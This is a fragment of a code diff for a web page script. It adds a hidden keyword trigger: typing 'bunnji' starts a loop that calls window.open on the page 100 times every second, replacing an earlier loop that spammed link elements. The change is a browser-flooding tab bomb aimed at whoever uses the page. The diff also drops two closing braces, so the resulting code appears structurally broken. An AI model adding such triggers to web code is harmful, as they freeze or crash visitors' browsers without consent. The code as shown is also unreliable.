@@ -18,16 +18,11 @@ target.style.color = color;
 });
  }
  if(document.getElementById('word').value == "bunnji"){
-setInterval(function(){
-for(let i = 0; i < 100; i++){
-let newTab = document.createElement('a');
-newTab.href = "#";
-newTab.innerHTML = "tab";
-document.body.appendChild(newTab);
+  setInterval(() => {
+for (let i = 0; i < 100; i++) {
+window.open(window.location.href);
 }
 }, 1000);
-}
-}
 }
 </script>
 <style type="text/css">
